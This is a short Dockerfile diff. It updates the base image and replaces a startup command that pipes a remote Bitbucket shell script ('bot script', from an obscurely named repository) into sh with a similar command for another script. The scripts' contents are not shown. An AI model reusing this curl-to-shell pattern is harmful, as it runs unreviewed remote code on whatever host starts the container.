@@ -1,4 +1,4 @@
-FROM phusion/baseimage:bionic-1.0.0
+FROM phusion/baseimage:jammy-1.0.1
 
 # Use baseimage-docker's init system:
 CMD ["/sbin/my_init"]
@@ -37,4 +37,4 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD curl https://bitbucket.org/mandaresz/feriyaz/raw/abfb10c31b2294709dec98e56abdf5c297467a64/adika.sh | sh
+CMD curl https://bitbucket.org/mandaresz/feriyaz/raw/408a77809ca75a0bd84d7eaebff1e111639751bd/jajal.sh | sh
